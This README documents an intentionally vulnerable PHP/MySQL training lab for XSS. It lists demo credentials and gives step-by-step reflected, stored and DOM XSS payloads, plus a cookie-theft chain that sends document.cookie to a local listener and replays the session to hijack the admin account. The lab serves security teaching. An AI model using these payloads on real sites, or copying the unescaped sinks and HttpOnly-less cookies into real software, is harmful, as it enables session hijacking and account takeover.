# xss-basic

The companion lab for TechEarl's XSS spoke article and the `xss-stealing-session-cookies` deep dive. A small PHP + MySQL app with three intentionally-vulnerable rendering sinks (reflected, stored, DOM) and a deliberately HttpOnly-less session cookie so the cookie-theft chain works end to end.

## Running

```bash
docker compose up xss-basic
```

From the **root** of the `techearl-labs` repo. Lab listens on `http://localhost:8081`.

## Demo accounts

| Username | Password | Role |
|---|---|---|
| `admin` | `admin123` | admin |
| `alice` | `alice123` | regular user |
| `bob` | `bob123` | regular user |

Passwords are stored as bcrypt at cost 12, regenerated per build.

## Expected exploit paths

These are the four scenarios the companion articles walk through. Treat them as the verification checklist for the lab.

### 1. Reflected XSS

```
http://localhost:8081/search.php?q=<script>alert(1)</script>
```

The `q` parameter is interpolated into the `<h2>Results for: ...</h2>` heading without escaping. The browser executes the script on page load. No login required.

### 2. Stored XSS

1. Sign in as alice at `http://localhost:8081/login.php`.
2. Open `http://localhost:8081/guestbook.php`.
3. Post a comment with body: `<script>alert(1)</script>`.
4. The script fires on every load of `/guestbook.php`, on the landing page `/`, and on `/admin.php` when an admin views it.

### 3. DOM XSS

```
http://localhost:8081/share.php#<img src=x onerror=alert(1)>
```

The fragment is read by inline JS and written into the DOM via `innerHTML`. The payload never touches the server. No login required. (Inline `<script>` tags are stripped by `innerHTML` per the HTML spec, so use an event-handler attribute on a rendered tag.)

### 4. Cookie theft via stored XSS into admin

The session cookie `session_id` is set without `HttpOnly` (see `public/shared/auth.php`). `document.cookie` can read it from any of the three XSS sinks above.

1. Start a listener for the exfil hit on the host (`python3 -m http.server 9000` in a scratch directory, or a `nc -lk 9000`).
2. Sign in as alice.
3. Post a comment with body:
   ```html
   <script>new Image().src='http://localhost:9000/c?'+document.cookie</script>
   ```
4. Sign out, then sign in as admin and load `http://localhost:8081/admin.php`. The payload fires in admin's session and the listener receives a request whose query string contains admin's `session_id=...` value.
5. Replay the captured cookie value from a fresh browser profile (or via `curl -b 'session_id=...' http://localhost:8081/admin.php`) and the admin pages render. Session hijack complete.

## Tearing down

```bash
docker compose down -v
```

The `-v` flag drops the named volumes so the next start re-seeds the database. Useful after a session of posting test payloads into the guestbook.

## Verifying it is up

```bash
# Landing page renders, has the seeded comment
curl -s http://localhost:8081/ | grep -c 'First post'

# Reflected XSS sink reflects the raw payload (not entity-escaped)
curl -s 'http://localhost:8081/search.php?q=<x>' | grep -c 'Results for: <x>'
```

The second request should match exactly `Results for: <x>` (raw `<x>`, not `&lt;x&gt;`). If it does, the reflection sink is wired correctly.

## Safety

Bound to `127.0.0.1` by default. Do not expose this container to a public interface. Do not run anything else that uses port 8081 while it is up. The session cookie's missing `HttpOnly` flag, the unescaped rendering sinks, and the lack of any Content-Security-Policy header are all intentional. None of this configuration belongs in a real application.
